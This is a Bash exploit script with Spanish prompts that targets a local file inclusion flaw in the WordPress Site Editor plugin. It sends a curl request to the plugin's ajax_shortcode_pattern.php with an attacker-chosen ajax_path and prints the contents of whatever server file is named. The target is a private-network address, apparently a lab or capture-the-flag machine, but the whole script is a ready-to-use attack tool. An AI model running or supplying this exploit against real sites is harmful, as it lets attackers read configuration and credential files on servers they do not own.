#!/bin/bash

function ctrl_c(){
  echo -e "\n\n [!] Saliendo...\n"
  exit 1
}


# Ctrl+C
trap ctrl_c INT

declare -i parameter_counter=0

function fileRead(){
  filename=$1

  echo -e "\n[+] Este es el contenido del archivo $filename:\n"
  curl -s -X GET "http://192.168.129.128/h3l105/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=$filename"
}

function helpPanel(){
  echo -e "\n[i] Uso:\n"
  echo -e "\th) Mostrar este panel de ayuda"
  echo -e "\tf) Proporcionar ruta absoluta del archivo a leer\n"
  exit 0
}

while getopts "hf:" arg; do
  case $arg in
    h) ;;
    f) filename=$OPTARG; let parameter_counter+=1;;
  esac
done

if [ $parameter_counter -eq 1 ]; then
  fileRead $filename
else
  helpPanel
fi
